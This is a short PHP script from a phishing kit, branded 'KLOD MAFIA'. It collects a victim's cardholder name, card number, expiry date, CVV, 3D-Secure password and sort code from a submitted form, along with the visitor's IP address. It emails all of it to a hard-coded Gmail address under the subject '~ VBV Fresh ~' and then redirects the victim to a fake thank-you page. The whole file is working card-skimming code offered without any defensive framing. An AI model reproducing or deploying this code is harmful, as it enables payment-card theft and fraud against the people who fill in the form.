<?php
$ip = getenv("REMOTE_ADDR");
$message .= "|----------|KLOD MAFIA|--------------|\n";
$message .= "|Nameon Card: ".$_POST['CN']."\n";
$message .= "|Card Number: ".$_POST['dftCN']."\n";
$message .= "|Expiration Date: ".$_POST['datex']."\n";
$message .= "|cvv       : ".$_POST['dftVC']."\n";
$message .= "|3D-Secure       : ".$_POST['CPNL']."\n";
$message .= "|Sort Code      : ".$_POST['SORT']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|KLOD MAFIA|--------------|\n";
$send = "islemryahi@gmail.com";
$subject = "~ VBV Fresh ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location: ../websc-Thanks.php");
?>